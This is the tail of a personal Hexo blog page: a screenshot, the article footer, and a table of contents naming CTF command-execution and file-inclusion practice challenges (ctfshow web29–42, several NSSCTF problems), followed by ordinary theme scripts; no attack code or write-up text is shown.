<p><img src="/../images/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20240227133801.png" alt="微信截图_20240227133801"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/02/27/2024-02-25%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%97/" data-id="clt3xvktx0001gwub67n8g8hs" data-title="" class="article-share-link">Share</a>
      
      
      
      
      
      

    </footer>
  </div>
  
    

  
</article>






</section>
          
            <aside id="sidebar">
  <div class="sidebar-wrap wow fadeInRight wrap-sticky">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-02-25%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%97"><span class="toc-number">1.</span> <span class="toc-text">2024-02-25刷题日志</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2024-hackgame-week-2-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">2024 hackgame week 2 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.1.</span> <span class="toc-text">考点：命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">ctfshow命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web29"><span class="toc-number">1.2.1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-30"><span class="toc-number">1.2.2.</span> <span class="toc-text">web 30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-31"><span class="toc-number">1.2.3.</span> <span class="toc-text">web 31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web32"><span class="toc-number">1.2.4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web34"><span class="toc-number">1.2.5.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-34"><span class="toc-number">1.2.6.</span> <span class="toc-text">Web 34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-35"><span class="toc-number">1.2.7.</span> <span class="toc-text">web 35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-37"><span class="toc-number">1.2.8.</span> <span class="toc-text">web 37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web39"><span class="toc-number">1.2.9.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-40"><span class="toc-number">1.2.10.</span> <span class="toc-text">web 40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web41"><span class="toc-number">1.2.11.</span> <span class="toc-text">&#x3D;&#x3D;web41&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web42"><span class="toc-number">1.2.12.</span> <span class="toc-text">web42</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E9%A2%98%E5%8D%95%E7%AC%AC%E4%BA%8C%E9%A1%B5%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">NSS命令执行（题单第二页）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">1.3.1.</span> <span class="toc-text">5 [CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3090-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">1.3.2.</span> <span class="toc-text">3090 [UUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2036-NISACTF-2022-level-up"><span class="toc-number">1.3.3.</span> <span class="toc-text">2036 [NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#497-%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E4%B8%AA%E4%BA%BA%E7%BB%84-%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="toc-number">1.3.4.</span> <span class="toc-text">497 [广东强网杯 2021 个人组]欢迎参加强网杯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1421-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">1.3.5.</span> <span class="toc-text">1421 [羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2883-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="toc-number">1.3.6.</span> <span class="toc-text">2883 [SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2826-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">1.3.7.</span> <span class="toc-text">2826 [SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3345-MoeCTF-2022-baby-file"><span class="toc-number">1.3.8.</span> <span class="toc-text">3345 [MoeCTF 2022]baby_file</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">考点：伪协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1379-GKCTF-2021-easycms"><span class="toc-number">1.3.9.</span> <span class="toc-text">1379 [GKCTF 2021]easycms</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2884-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-xff"><span class="toc-number">1.3.10.</span> <span class="toc-text">2884 [SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1897-NISACTF-2022-middlerce"><span class="toc-number">1.3.11.</span> <span class="toc-text">1897 [NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2604-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell"><span class="toc-number">1.3.12.</span> <span class="toc-text">2604 [HUBUCTF 2022 新生赛]HowToGetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#364-%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval"><span class="toc-number">1.3.13.</span> <span class="toc-text">364 [天翼杯 2021]esay_eval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2641-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-webdog1-start"><span class="toc-number">1.3.14.</span> <span class="toc-text">2641 [SWPUCTF 2022 新生赛]webdog1__start</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Amd5%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%8Crobot"><span class="toc-number">1.3.14.1.</span> <span class="toc-text">考点：md5的绕过，robot</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%80%83%E7%82%B9%E6%98%AFrobots-txt"><span class="toc-number">1.3.14.2.</span> <span class="toc-text">第二个考点是robots.txt</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.15.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.15.1.</span> <span class="toc-text">考点：日志文件包含</span></a></li></ol></li></ol></li></ol></li></ol></div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
  <div class="sidebar-author-name">John Doe</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">1</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Friend</div>
    </div>
  
</div>
</div>
    
    
      <div class="sidebar-btn-wrapper" style="position:static">
        <div class="sidebar-toc-btn current"></div>
        <div class="sidebar-common-btn"></div>
      </div>
    
  </div>

  
</aside>

          
        </div>
        <footer id="footer" class="wow fadeInUp">
  <div style="width: 100%; overflow: hidden">
    <div class="footer-line"></div>
  </div>
  <div class="outer">
    <div id="footer-info" class="inner">
      
      <div>
        <span class="icon-copyright"></span>
        2020-2024
        <span class="footer-info-sep"></span>
        John Doe
      </div>
      
        <div>
          Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>&nbsp;
          Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" target="_blank">Reimu</a>
        </div>
      
      
        <div>
          <span class="icon-brush"></span>
          1.8k
          &nbsp;|&nbsp;
          <span class="icon-coffee"></span>
          00:07
        </div>
      
      
        <div>
          <span class="icon-eye"></span>
          <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
          &nbsp;|&nbsp;
          <span class="icon-user"></span>
          <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
        </div>
      
    </div>
  </div>
</footer>

        <div class="sidebar-top">
          <img src="/images/taichi.png" height="50" width="50" />
          <div class="arrow-up"></div>
        </div>
        <div id="mask"></div>
      </div>
      <nav id="mobile-nav">
  <div class="sidebar-wrap">
    
      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
  <h3 class="toc-title">Contents</h3>
  <div class="sidebar-toc-wrapper"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#2024-02-25%E5%88%B7%E9%A2%98%E6%97%A5%E5%BF%97"><span class="toc-number">1.</span> <span class="toc-text">2024-02-25刷题日志</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2024-hackgame-week-2-%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">2024 hackgame week 2 复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.1.1.</span> <span class="toc-text">考点：命令执行</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ctfshow%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.2.</span> <span class="toc-text">ctfshow命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#web29"><span class="toc-number">1.2.1.</span> <span class="toc-text">web29</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-30"><span class="toc-number">1.2.2.</span> <span class="toc-text">web 30</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-31"><span class="toc-number">1.2.3.</span> <span class="toc-text">web 31</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web32"><span class="toc-number">1.2.4.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web34"><span class="toc-number">1.2.5.</span> <span class="toc-text">web34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Web-34"><span class="toc-number">1.2.6.</span> <span class="toc-text">Web 34</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-35"><span class="toc-number">1.2.7.</span> <span class="toc-text">web 35</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-37"><span class="toc-number">1.2.8.</span> <span class="toc-text">web 37</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web39"><span class="toc-number">1.2.9.</span> <span class="toc-text">web39</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web-40"><span class="toc-number">1.2.10.</span> <span class="toc-text">web 40</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web41"><span class="toc-number">1.2.11.</span> <span class="toc-text">&#x3D;&#x3D;web41&#x3D;&#x3D;</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#web42"><span class="toc-number">1.2.12.</span> <span class="toc-text">web42</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NSS%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E9%A2%98%E5%8D%95%E7%AC%AC%E4%BA%8C%E9%A1%B5%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">NSS命令执行（题单第二页）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#5-CISCN-2019%E5%8D%8E%E4%B8%9C%E5%8D%97-Web11"><span class="toc-number">1.3.1.</span> <span class="toc-text">5 [CISCN 2019华东南]Web11</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3090-UUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">1.3.2.</span> <span class="toc-text">3090 [UUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2036-NISACTF-2022-level-up"><span class="toc-number">1.3.3.</span> <span class="toc-text">2036 [NISACTF 2022]level-up</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#497-%E5%B9%BF%E4%B8%9C%E5%BC%BA%E7%BD%91%E6%9D%AF-2021-%E4%B8%AA%E4%BA%BA%E7%BB%84-%E6%AC%A2%E8%BF%8E%E5%8F%82%E5%8A%A0%E5%BC%BA%E7%BD%91%E6%9D%AF"><span class="toc-number">1.3.4.</span> <span class="toc-text">497 [广东强网杯 2021 个人组]欢迎参加强网杯</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1421-%E7%BE%8A%E5%9F%8E%E6%9D%AF-2020-easycon"><span class="toc-number">1.3.5.</span> <span class="toc-text">1421 [羊城杯 2020]easycon</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2883-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-1z-unserialize"><span class="toc-number">1.3.6.</span> <span class="toc-text">2883 [SWPUCTF 2022 新生赛]1z_unserialize</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2826-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-ez-rce"><span class="toc-number">1.3.7.</span> <span class="toc-text">2826 [SWPUCTF 2022 新生赛]ez_rce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3345-MoeCTF-2022-baby-file"><span class="toc-number">1.3.8.</span> <span class="toc-text">3345 [MoeCTF 2022]baby_file</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.3.8.1.</span> <span class="toc-text">考点：伪协议</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1379-GKCTF-2021-easycms"><span class="toc-number">1.3.9.</span> <span class="toc-text">1379 [GKCTF 2021]easycms</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2884-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-xff"><span class="toc-number">1.3.10.</span> <span class="toc-text">2884 [SWPUCTF 2022 新生赛]xff</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1897-NISACTF-2022-middlerce"><span class="toc-number">1.3.11.</span> <span class="toc-text">1897 [NISACTF 2022]middlerce</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2604-HUBUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-HowToGetShell"><span class="toc-number">1.3.12.</span> <span class="toc-text">2604 [HUBUCTF 2022 新生赛]HowToGetShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#364-%E5%A4%A9%E7%BF%BC%E6%9D%AF-2021-esay-eval"><span class="toc-number">1.3.13.</span> <span class="toc-text">364 [天翼杯 2021]esay_eval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2641-SWPUCTF-2022-%E6%96%B0%E7%94%9F%E8%B5%9B-webdog1-start"><span class="toc-number">1.3.14.</span> <span class="toc-text">2641 [SWPUCTF 2022 新生赛]webdog1__start</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9Amd5%E7%9A%84%E7%BB%95%E8%BF%87%EF%BC%8Crobot"><span class="toc-number">1.3.14.1.</span> <span class="toc-text">考点：md5的绕过，robot</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E4%B8%AA%E8%80%83%E7%82%B9%E6%98%AFrobots-txt"><span class="toc-number">1.3.14.2.</span> <span class="toc-text">第二个考点是robots.txt</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.3.15.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%80%83%E7%82%B9%EF%BC%9A%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.3.15.1.</span> <span class="toc-text">考点：日志文件包含</span></a></li></ol></li></ol></li></ol></li></ol></div>
</div>
</div>
      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="John Doe" class="lazyload">
  <div class="sidebar-author-name">John Doe</div>
  <div class="sidebar-description"></div>
</div>
<div class="sidebar-state">
  <div class="sidebar-state-article">
    <div>Posts</div>
    <div class="sidebar-state-number">1</div>
  </div>
  <div class="sidebar-state-category">
    <div>Categories</div>
    <div class="sidebar-state-number">0</div>
  </div>
  <div class="sidebar-state-tag">
    <div>Tags</div>
    <div class="sidebar-state-number">0</div>
  </div>
</div>
<div class="sidebar-social">
  
</div>
<div class="sidebar-menu">
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Home</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Archives</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">About</div>
    </div>
  
    <div class="sidebar-menu-link-wrap">
      <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
      <span class="sidebar-menu-icon"></span>
      <div class="sidebar-menu-link">Friend</div>
    </div>
  
</div>
</div>
    
  </div>
  
    <div class="sidebar-btn-wrapper">
      <div class="sidebar-toc-btn current"></div>
      <div class="sidebar-common-btn"></div>
    </div>
  
</nav>

    </div>
    <div class="site-search">
      <div class="reimu-popup popup">
        <div class="reimu-search">
          <span class="reimu-search-input-icon"></span>
          <div class="reimu-search-input" id="reimu-search-input"></div>
        </div>
        <div class="reimu-results">
          <div id="reimu-stats"></div>
          <div id="reimu-hits"></div>
          <div id="reimu-pagination" class="reimu-pagination"></div>
        </div>
        <span class="popup-btn-close"></span>
      </div>
    </div>
    
<script src="https://npm.webcache.cn/jquery@3.7.1/dist/jquery.min.js"></script>


<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js"></script>


<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js"></script>



  
<script src="https://npm.webcache.cn/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>



  
<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" async></script>






<script src="/js/pjax_script.js" data-pjax></script>

















  
<script src="https://npm.webcache.cn/mouse-firework@0.0.4/dist/index.umd.js"></script>

  <script>
    firework(JSON.parse('{"excludeElements":["a"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
  </script>







<script src="/js/script.js"></script>



  <script>
    console.log(String.raw`%c 
 ______     ______     __     __    __     __  __    
/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
 \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
                                                  
`,'color: #ff5252;')
    console.log('%c Theme.Reimu v' + '0.1.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
  </script>
  

  <!-- hexo injector body_end start -->
<script src="/js/insert_highlight.js" data-pjax></script>
<!-- hexo injector body_end end --></body>
  </html>

